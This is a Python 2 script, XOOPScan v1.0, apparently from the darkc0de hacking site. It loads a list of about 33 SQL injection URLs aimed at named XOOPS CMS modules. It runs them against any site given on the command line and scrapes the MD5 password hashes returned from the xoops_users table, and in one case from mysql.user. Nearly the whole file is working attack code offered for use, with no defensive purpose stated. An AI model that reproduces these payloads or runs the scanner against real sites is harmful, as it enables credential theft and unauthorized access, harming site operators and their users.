#!/usr/bin/python
#XOOPS Module SQL scanner, checks source for md5's

#Uncomment line 63 for verbose mode. If md5 found
#check manually.

#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import sys, urllib2, re, time

print "\n\t   d3hydr8[at]gmail[dot]com XOOPScan v1.0"
print "\t------------------------------------------"

sqls = ["modules/myAds/annonces-p-f.php?op=ImprAnn&lid=-1+union+select+1,pass,uid,uname,5,6,7,8,9,10,11,12,13+from+xoops_users+limit+1,1/*",
	"modules/articles/print.php?id=3/**/UNION/**/SELECT/**/NULL,NULL,NULL,NULL,uid,uname,pass,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL/**/FROM/**/xoops_users/**/LIMIT/**/1,1/*",
	"modules/articles/index.php?cat_id=-1%20union%20select%201,2,concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass),4,5,6%20from%20xoops_users%20where%20uid%20like%201/*",
	"modules/articles/index.php?cat_id=-1%20union%20select%201,concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass),3,4%20from%20xoops_users%20where%20uid%20like%201/*",
	"modules/friendfinder/view.php?id=-1'%20union%20select%201,2,3,4,5,6,7,8,concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20from%20xoops_users%20where%20uid%20like%201/*",
	"modules/myads/index.php?pa=view&cid=-1%20union%20select%201,concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass),3%20from%20xoops_users/*",
	"modules/repository/viewcat.php?cid=111111%20union%20select%202,concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass)%20from%20xoops_users%20where%20uid%20like%201/*",
	"modules/core/viewcat.php?cid=99999%20union%20select%201,concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass)%20from%20xoops_users%20where%20uid%20like%201/*",
	"modules/core/viewcat.php?cid=98989898%20union%20select%201,concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass)%20from%20xoops_users%20where%20uid%20like%201/*",
	"modules/ecal/display.php?katid=-1%20union%20select%20concat(char(117,115,101,114,110,97,109,101,58),user,char(112,97,115,115,119,111,114,100,58),password),2%20from%20mysql.user/*",
	"modules/tinyevent/index.php?op=show&id=999999%20union%20select%201,2,3,4,concat(char(117,115,101,114,110,97,109,101,45,45),uname,char(112,97,115,115,119,111,114,100,45,45),pass)%20from%20xoops_users%20where%20uid%20like%201/*",
	"modules/kshop/product_details.php?id=9999999%20union%20select%201,2,concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass),4,5,6,7,8,0,0,0,0%20from%20xoops_users%20where%20uid%20like%201/*",
	"modules/camportail/show.php?op=showcam&camid=999999%20union%20select%201,2,3,4,5,concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass),7,8,9,1,02,3,4,5,6%20from%20xoops_users%20where%20uid%20like%201/*",
	"modules/myalbum/viewcat.php?cid=9999999%20union%20select%201111,concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass)%20from%20xoops_users%20where%20uid%20like%201/*",
	"modules/wfsection/print.php?articleid=9999999%20union%20select%201111,2222,3333,4444,concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass),6666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20from%20xoops_users%20where%20uid%20like%201/*",
	"modules/zmagazine/print.php?articleid=9999999%20union%20select%201,2,3,concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass),5,6,7,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20from%20xoops_users%20where%20uid%20like%201/*",
	"modules/rha7downloads/visit.php?cid=-1&lid=-1%20union%20select%20concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass),2%20from%20xoops_users%20where%20uid%20like%201/*",
	"modules/wflinks/viewcat.php?cid=-1%20union%20select%202,concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass)%20from%20xoops_users%20where%20uid%20like%201/*",
	"modules/jobs/index.php?pa=jobsview&cid=-1%20union%20select%203,concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass),1%20from%20xoops_users%20where%20uid%20like%201/*",
	"modules/flashgames/game.php?lid=-19/**/UNION/**/SELECT/**/0,1,pass,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18/**/FROM/**/xoops_users/**/LIMIT/**/1,1/*",
	"modules/wfquotes/index.php?op=cat&c=1/**/UNION/**/SELECT/**/0,uname,pass,3,4,5/**/FROM/**/xoops_users/**/LIMIT/**/1,1/*",
	"modules/glossaire/glossaire-p-f.php?op=ImprDef&sid=999999%20union%20select%20concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass),2,3%20from%20xoops_users%20where%20uid%20like%201/*",
	"modules/myconference/index.php?sid=-1%20union%20select%20concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass,char(98,105,116,101,114))%20from%20xoops_users%20where%20uid%20like%201/*",
	"modules/myTopics/print.php?articleid=-9999999/**/union/**/select+1,char(112,115,101,114),0,concat(uname,0x3a,pass),0,char(117,115,101,114,110,97,109,101,58),0,0,0,0,1,1,1,1,1,1,1,1,1,1,0,0,111,333,222,0,0,0,0/**/from%2F%2A%2A%2Fxoops_users/*%20where%20admin%201%200%201%20",
	"modules/eEmpregos/index.php?pa=view&cid=-00000000%2F%2A%2A%2Funion%2F%2A%2A%2Fselect+0,1,concat(uname,0x3a,pass)/**/from%2F%2A%2A%2Fxoops_users/*/*where%20admin%201=%202",
	"modules/classifieds/index.php?pa=Adsview&cid=-00000%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/0x3a,0x3a,concat(uname,0x3a,pass)/**/from+xoops_users/*where%20admin%20-1",
	"modules/glossaires/glossaires-p-f.php?op=ImprDef&sid=99999/**/union/**/select/**/000,pass,uname,pass/**/from/**/xoops_users/*where%20terme",
	"modules/wfdownloads/viewcat.php?cid=999%2F%2A%2A%2Funion%2F%2A%2A%2Fselect+000,concat(uname,0x3a,pass)/**/from%2F%2A%2A%2Fxoops_users/*where%20pass",
	"modules/gallery/index.php?do=showgall&gid=-9999999/**/union/**/select/**/0,1,concat(uname,0x3a,pass),3,4,5,6/**/from/**/xoops_users/*",
	"modules/my_egallery/index.php?do=showgall&gid=-9999999/**/union/**/select/**/0,1,concat(uname,0x3a,pass),3,4,5,6/**/from+xoops_users/*",
	"modules/tutorials/printpage.php?tid=-9999999/**/union/**/select/**/concat(uname,0x3a,pass),1,concat(uname,0x3a,pass),3,4,5/**/from/**/xoops_users/*",
	"modules/tutorials/index.php?op=printpage&tid=-9999999/**/union/**/select/**/0,1,concat(uname,0x3a,pass),3/**/from/**/xoops_users/*",
	"modules/dictionary/print.php?id=-9999999/**/union/**/select/**/concat(uname,0x3a,pass),concat(uname,0x3a,pass)/**/from/**/xoops_users/*"]

if len(sys.argv) != 2:
	print "\nUsage: ./xoopscan.py <site>"
	print "Ex: ./xoopscan.py www.test.com\n"
	sys.exit(1)

host = sys.argv[1].replace("/index.php", "")
if host[-1] != "/":
	host = host+"/"
if host[:7] != "http://":
	host = "http://"+host
	
print "\n[+] Site:",host
print "[+] SQL Loaded:",len(sqls) 

print "[+] Starting Scan...\n" 
for sql in sqls:
	time.sleep(3) #Change this if needed
	#print "[+] Trying:",host+sql.replace("\n","")
	try:
		source = urllib2.urlopen(host+sql.replace("\n","")).read()
		md5s = re.findall("[a-f0-9]"*32,source)
		if len(md5s) >= 1:
			print "[!]",host+sql.replace("\n","")
			for md5 in md5s:
				print "\n[+]MD5:",md5
	except(urllib2.HTTPError,urllib2.URLError):
		pass
print "\n[-] Done\n"